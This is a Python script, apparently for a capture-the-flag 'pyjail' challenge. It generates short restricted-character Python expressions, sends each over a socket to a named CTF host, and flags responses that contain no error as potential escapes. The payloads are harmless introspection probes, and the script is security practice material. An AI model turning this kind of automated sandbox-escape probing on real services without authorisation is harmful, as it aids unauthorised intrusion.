import socket
import itertools
import time

class PyjailExploit:
    def __init__(self, host="misc.1nf1n1ty.team", port=30010):
        self.host = host
        self.port = port
        self.allowed_chars = "$(),/:;=EHSUVWYZ]bcdinqz{"
        self.max_length = 12
        
    def is_valid_payload(self, payload):
        if len(payload) > self.max_length:
            return False
        return all(c in self.allowed_chars for c in payload)
    
    def test_connection(self, payload):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.host, self.port))
                # Receive banner
                sock.recv(1024)
                # Send payload
                sock.send(payload.encode() + b'\n')
                # Get response
                response = sock.recv(1024).decode()
                return response
        except Exception as e:
            print(f"Connection error: {e}")
            return None

    def generate_payloads(self):
        """Generate payloads without using numbers"""
        # Base variables we can use
        variables = ['E', 'H', 'S', 'U', 'V', 'W', 'Y', 'Z']
        
        payloads = [
            # Try to access various special values
            "id",          # Built-in function
            "id(id)",     # Nested function call
            "dir()",      # Directory listing
            "()",         # Empty tuple
            "(,)",        # Tuple with empty element
            "dict()",     # Empty dict
            
            # Try walrus operator patterns
            "(id:=id)",
            "(dir:=dir)",
            
            # Try built-in names we can construct
            "bin",
            "bin()",
            "dir",
            "dir()",
            "id(bin)",
            "id(dir)",
            
            # Try accessing special attributes/variables
            "__dic__",
            "__bid__",
            
            # Try tuple variations
            "(dir,)",
            "(id,)",
            "(id,dir)",
            
            # Try assignment patterns
            "d=dir;d",
            "b=bin;b",
            "i=id;i"
        ]
        
        # Add variable combinations
        for v in variables:
            # Simple assignment
            p = f"{v}=dir;{v}"
            if self.is_valid_payload(p):
                payloads.append(p)
                
            # Walrus operator
            p = f"({v}:=dir)"
            if self.is_valid_payload(p):
                payloads.append(p)
        
        return [p for p in payloads if self.is_valid_payload(p)]

    def test_all_payloads(self):
        payloads = self.generate_payloads()
        print(f"Testing {len(payloads)} valid payloads...")
        
        for payload in payloads:
            print(f"\nTesting payload: {payload}")
            response = self.test_connection(payload)
            if response:
                print(f"Response: {response.strip()}")
                # Check if we got something interesting
                if "error" not in response.lower():
                    print(f"[!] Potentially successful payload: {payload}")
            time.sleep(0.5)  # Delay to not overwhelm server

def main():
    exploit = PyjailExploit()
    exploit.test_all_payloads()

if __name__ == "__main__":
    main()
